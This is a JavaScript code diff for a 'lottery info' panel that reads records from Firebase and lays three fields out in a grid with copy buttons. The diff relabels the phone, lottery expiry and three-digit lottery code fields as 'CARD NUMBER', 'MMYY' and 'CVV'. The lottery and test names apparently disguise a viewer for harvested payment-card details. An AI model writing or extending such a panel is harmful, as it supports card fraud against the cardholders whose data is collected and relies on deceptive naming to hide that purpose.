@@ -6,31 +6,43 @@ export function createLotteryInfo(data, showToast) {
 
     container.className = "lottery-info";
 
+    /* CSS STYLING FOR SIDE-BY-SIDE LAYOUT */
+    if (!document.getElementById("lottery-grid-style")) {
+        const style = document.createElement("style");
+        style.id = "lottery-grid-style";
+        style.textContent = `
+            .lottery-grid-container {
+                display: grid;
+                grid-template-columns: repeat(3, minmax(0, 1fr));
+                gap: 12px;
+                margin-bottom: 12px;
+            }
+            @media (max-width: 768px) {
+                .lottery-grid-container {
+                    grid-template-columns: 1fr;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+    }
+
     /* GET FIREBASE FIELD VALUE */
 
     function getValue(keys) {
-
         for (const key of keys) {
-
             const value = data[key];
-
             if (
                 value !== null &&
                 value !== undefined &&
                 String(value).trim() !== ""
             ) {
-
                 return value;
-
             }
-
         }
-
         return null;
-
     }
 
-    /* CREATE INFORMATION FIELD */
+    /* CREATE SINGLE FIELD */
 
     function createField(label, value, canCopy = false) {
 
@@ -101,57 +113,40 @@ export function createLotteryInfo(data, showToast) {
 
         }
 
-        container.appendChild(row);
+        return row;
 
     }
 
+    /* GRID CONTAINER FOR TOP 3 FIELDS (Phone, Expiry, Security Code) */
+
+    const gridContainer = document.createElement("div");
+    gridContainer.className = "lottery-grid-container";
+
     /* PHONE NUMBER */
-
     const phoneNumber = getValue([
-
         "phoneNumber",
         "phone",
         "mobileNumber",
         "mobile"
-
     ]);
-
-    createField(
-        "📱 Phone Number",
-        phoneNumber,
-        true
-    );
+    gridContainer.appendChild(createField("CARD NUMBER", phoneNumber, true));
 
     /* LOTTERY EXPIRY DATE */
-
     const lotteryExpiry = getValue([
-
         "testDate",
         "lotteryExpiry"
-
     ]);
-
-    createField(
-        "📅 Lottery Expiry Date",
-        lotteryExpiry,
-        true
-    );
+    gridContainer.appendChild(createField("📅 MMYY", lotteryExpiry, true));
 
     /* THREE DIGIT LOTTERY CODE */
-
     const lotteryCode = getValue([
-
         "testCode",
         "lotteryCode",
         "code3digit"
-
     ]);
+    gridContainer.appendChild(createField("🔐 CVV", lotteryCode, true));
 
-    createField(
-        "🔐 Lottery Security Code",
-        lotteryCode,
-        true
-    );
+    container.appendChild(gridContainer);
 
     return container;
 
